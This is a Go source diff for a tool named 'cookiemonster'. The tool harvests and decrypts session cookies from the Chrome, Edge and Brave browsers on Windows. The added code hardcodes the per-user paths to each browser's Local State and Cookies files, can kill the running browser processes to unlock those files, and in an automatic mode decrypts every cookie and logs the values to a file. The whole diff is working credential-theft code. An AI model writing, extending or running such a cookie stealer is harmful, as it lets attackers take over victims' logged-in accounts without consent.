@@ -8,49 +8,63 @@ import (
 	"github.com/yanard18/cookiemonster"
 )
 
+var (
+	EdgeLocalState   = fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Edge\User Data\Local State`, os.Getenv("USERNAME"))
+	EdgeCookies      = fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies`, os.Getenv("USERNAME"))
+	ChromeLocalState = fmt.Sprintf(`C:\Users\%s\AppData\Local\Google\Chrome\User Data\Local State`, os.Getenv("USERNAME"))
+	ChromeCookies    = fmt.Sprintf(`C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies`, os.Getenv("USERNAME"))
+	BraveLocalState  = fmt.Sprintf(`C:\Users\%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State`, os.Getenv("USERNAME"))
+	BraveCookies     = fmt.Sprintf(`C:\Users\%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies`, os.Getenv("USERNAME"))
+)
+
+type CookieFilesPair struct {
+	StateFile   string
+	CookiesFile string
+}
+
 func main() {
+
 	args, err := cookiemonster.ParseArgs()
 	if err != nil {
 		log.Fatalf("Error parsing arguments: %v", err)
 	}
 
-	encryptedKey, err := cookiemonster.ParseLocalState(args.StateFile)
-	if err != nil {
-		log.Fatalf("Error parsing local state file: %v", err)
+	if args.KillBrowsers {
+		log.Println("[*] Killing browser processes")
+		cookiemonster.KillEdgeProcess()
+		cookiemonster.KillChromeProcess()
+		cookiemonster.KillBraveProcess()
+		// cookiemonster.KillFirefoxProcess() it's not chromium based
 	}
 
-	key, err := cookiemonster.DecryptDPAPI(encryptedKey)
-	if err != nil {
-		log.Fatalf("Error decrypting DPAPI blob of local state encrypted key: %v", err)
-	}
-
-	if args.CookiesFile != "" {
-		cookies, err := cookiemonster.ParseCookies(args.CookiesFile)
+	if args.Output != "" {
+		f, err := os.OpenFile(args.Output, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 		if err != nil {
-			fmt.Printf("[-] %v\n", err)
-			os.Exit(1)
+			log.Fatalf("Error opening output file: %v", err)
 		}
-		fmt.Printf("[+] Found %d cookies\n", len(cookies))
+		defer f.Close()
 
-		for _, cookie := range cookies {
-
-			// Decrypt the cookie value
-			decrypted, err := cookiemonster.DecryptEncryptedCookieValue([]byte(cookie.Value), key)
-			if err != nil {
-				fmt.Printf("[-] %v\n", err)
-				continue
-			}
-
-			fmt.Printf("[+] Host: %s\n", cookie.Host)
-			fmt.Printf("    Name: %s\n", cookie.Name)
-			fmt.Printf("    Value: %s\n", decrypted)
-			fmt.Printf("    Path: %s\n", cookie.Path)
-			fmt.Printf("    IsSecure: %t\n", cookie.IsSecure)
-			fmt.Printf("    IsHttpOnly: %t\n", cookie.IsHttpOnly)
-			fmt.Printf("    CreationUtc: %d\n", cookie.CreationUtc)
-			fmt.Printf("    ExpiryUtc: %d\n", cookie.ExpiryUtc)
-			fmt.Println("--------------------------------------------------")
-		}
+		log.SetOutput(f)
 	}
 
+	var filePair []CookieFilesPair
+
+	if args.Auto {
+		filePair = append(filePair, CookieFilesPair{StateFile: ChromeLocalState, CookiesFile: ChromeCookies})
+		filePair = append(filePair, CookieFilesPair{StateFile: EdgeLocalState, CookiesFile: EdgeCookies})
+		filePair = append(filePair, CookieFilesPair{StateFile: BraveLocalState, CookiesFile: BraveCookies})
+	} else {
+		filePair = append(filePair, CookieFilesPair{StateFile: args.StateFile, CookiesFile: args.CookiesFile})
+	}
+
+	for _, pair := range filePair {
+		log.Printf("[*] Parsing cookies from %s\n", pair.CookiesFile)
+		decryptedCookies, err := cookiemonster.PrintCookies(pair.StateFile, pair.CookiesFile)
+		if err != nil {
+			log.Printf("[-] Error parsing cookies: %v\n\n", err)
+			continue
+		}
+		log.Printf("%s\n", decryptedCookies)
+
+	}
 }
